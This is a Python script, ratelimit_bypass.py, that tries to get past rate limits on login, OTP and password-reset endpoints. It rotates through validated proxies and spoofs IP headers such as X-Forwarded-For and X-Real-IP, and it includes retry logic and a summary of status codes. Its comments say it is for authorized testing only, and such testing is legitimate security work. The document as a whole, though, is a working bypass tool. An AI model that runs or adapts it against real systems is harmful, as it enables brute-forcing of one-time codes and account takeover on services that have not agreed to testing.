#!/usr/bin/env python3
"""
ratelimit_bypass.py
--------------------
Rate-limit / 429 bypass tester using rotating proxies and IP-spoofing headers.
Useful for verifying whether an endpoint (e.g. password-reset, OTP, login)
actually enforces rate limiting per-account vs. just per-source-IP.

Upgrades over the original version:
  - No hardcoded target or proxy list — both come from CLI args / a proxy file.
  - Validates each proxy before use (quick liveness check) instead of blindly firing.
  - Retries on proxy failure instead of just logging and moving on.
  - Also tests IP-spoofing headers (X-Forwarded-For etc.) as a proxy-free bypass vector.
  - Structured JSON output + summary of which status codes were seen.
  - Only for use against targets you are authorized to test.

Usage:
    python3 ratelimit_bypass.py -u https://target.com/api/request-reset -n 10
    python3 ratelimit_bypass.py -u https://target.com/api/request-reset -n 20 --proxy-file proxies.txt
    python3 ratelimit_bypass.py -u https://target.com/api/request-reset --header-spoof-only

proxies.txt format (one per line):
    1.2.3.4:8080
    5.6.7.8:3128
"""

import argparse
import json
import random
import sys
import time
from ipaddress import IPv4Address

import requests

DEFAULT_HEADERS = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}


def random_ip():
    return str(IPv4Address(random.randint(0x0A000001, 0xDFFFFFFE)))


def load_proxies(path):
    with open(path) as f:
        return [line.strip() for line in f if line.strip() and not line.startswith("#")]


def proxy_is_alive(proxy_ip, timeout=5):
    try:
        r = requests.get("https://api.ipify.org?format=json",
                          proxies={"http": f"http://{proxy_ip}", "https": f"http://{proxy_ip}"},
                          timeout=timeout)
        return r.status_code == 200
    except Exception:
        return False


def request_via_proxy(url, method, proxy_ip, timeout, extra_headers=None):
    headers = {**DEFAULT_HEADERS, **(extra_headers or {})}
    proxies = {"http": f"http://{proxy_ip}", "https": f"http://{proxy_ip}"} if proxy_ip else None
    return requests.request(method, url, headers=headers, proxies=proxies,
                             timeout=timeout, allow_redirects=False)


def request_via_header_spoof(url, method, timeout):
    """No proxy — just spoof the IP-related headers many apps trust blindly."""
    spoof_ip = random_ip()
    headers = {
        **DEFAULT_HEADERS,
        "X-Forwarded-For": spoof_ip,
        "X-Real-IP": spoof_ip,
        "X-Originating-IP": spoof_ip,
        "X-Client-IP": spoof_ip,
    }
    resp = requests.request(method, url, headers=headers, timeout=timeout, allow_redirects=False)
    return resp, spoof_ip


def run(url, method, n, proxies, delay, retries, timeout, header_spoof_only, out_path):
    results = []
    status_counts = {}

    live_proxies = []
    if proxies and not header_spoof_only:
        print(f"[*] Validating {len(proxies)} proxies...")
        for p in proxies:
            if proxy_is_alive(p, timeout=timeout):
                live_proxies.append(p)
                print(f"    [alive] {p}")
            else:
                print(f"    [dead]  {p}")
        if not live_proxies:
            print("[-] No live proxies found — falling back to header-spoof mode.")
            header_spoof_only = True

    for i in range(1, n + 1):
        attempt_ok = False
        for attempt in range(retries + 1):
            try:
                if header_spoof_only or not live_proxies:
                    resp, marker = request_via_header_spoof(url, method, timeout)
                else:
                    marker = random.choice(live_proxies)
                    resp = request_via_proxy(url, method, marker, timeout)

                status_counts[resp.status_code] = status_counts.get(resp.status_code, 0) + 1
                print(f"[{i}/{n}] via={marker} status={resp.status_code} len={len(resp.content)}")
                results.append({"i": i, "via": marker, "status": resp.status_code, "length": len(resp.content)})
                attempt_ok = True
                break
            except Exception as e:
                print(f"[{i}/{n}] attempt {attempt + 1} failed: {e}")
                time.sleep(1)
        if not attempt_ok:
            results.append({"i": i, "via": None, "status": None, "error": "all retries failed"})
        time.sleep(delay)

    print("\n[+] Status code distribution:")
    for status, count in sorted(status_counts.items()):
        print(f"    {status}: {count}")

    if 429 not in status_counts and n >= 5:
        print("\n[!] No 429s seen across attempts — endpoint may not be rate-limiting "
              "per-IP at all, or the limit threshold is higher than n. Investigate further.")

    if out_path:
        with open(out_path, "w") as f:
            json.dump({"url": url, "method": method, "results": results, "summary": status_counts}, f, indent=2)
        print(f"\n[*] Results saved to {out_path}")


def main():
    parser = argparse.ArgumentParser(description="Rate-limit (429) bypass tester (authorized testing only)")
    parser.add_argument("-u", "--url", required=True, help="Target endpoint URL")
    parser.add_argument("-m", "--method", default="GET", help="HTTP method (default: GET)")
    parser.add_argument("-n", "--requests", type=int, default=10, help="Number of requests to fire (default: 10)")
    parser.add_argument("--proxy-file", help="Path to a file with one proxy per line (ip:port)")
    parser.add_argument("--header-spoof-only", action="store_true",
                         help="Skip proxies entirely, only test X-Forwarded-For style spoofing")
    parser.add_argument("--delay", type=float, default=1.0, help="Delay between requests in seconds (default: 1.0)")
    parser.add_argument("--retries", type=int, default=1, help="Retries per request on failure (default: 1)")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout in seconds (default: 10)")
    parser.add_argument("-o", "--output", help="Save results as JSON to this path")
    args = parser.parse_args()

    proxies = load_proxies(args.proxy_file) if args.proxy_file else []

    print(f"[*] Target: {args.url}")
    print("[!] Only run this against targets you are authorized to test.\n")

    run(args.url, args.method, args.requests, proxies, args.delay, args.retries,
        args.timeout, args.header_spoof_only, args.output)


if __name__ == "__main__":
    main()
